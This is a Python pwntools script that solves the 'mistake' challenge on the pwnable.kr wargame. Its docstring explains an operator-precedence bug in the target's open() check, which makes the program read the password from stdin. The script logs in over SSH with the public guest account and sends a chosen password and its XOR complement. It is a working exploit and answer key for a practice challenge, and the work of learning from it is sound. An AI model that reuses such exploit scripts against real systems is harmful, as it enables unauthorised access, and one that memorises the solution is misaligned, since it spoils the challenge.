"""
This pwn is really what its name says...
in the source code program has the part with next line:
if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0)
When we want to open the 'password' file it opens the file and checks if its descriptor is less then 0
In the result we have our fd variable with file descriptor which is equal to 1
And program just reads the password from stdin...
"""
from pwn import *


def exploit():
    s = ssh(user='mistake', host='pwnable.kr', password='guest', port=2222)
    p = s.process(executable='./mistake')
    # My password
    password = '1010101010'.encode()
    # My answer. xor of password
    answer   = '0101010101'.encode()
    p.sendline(password)
    p.sendline(answer)
    print(p.recvall().decode('utf-8'))
    p.close()


if __name__=='__main__':
    exploit()
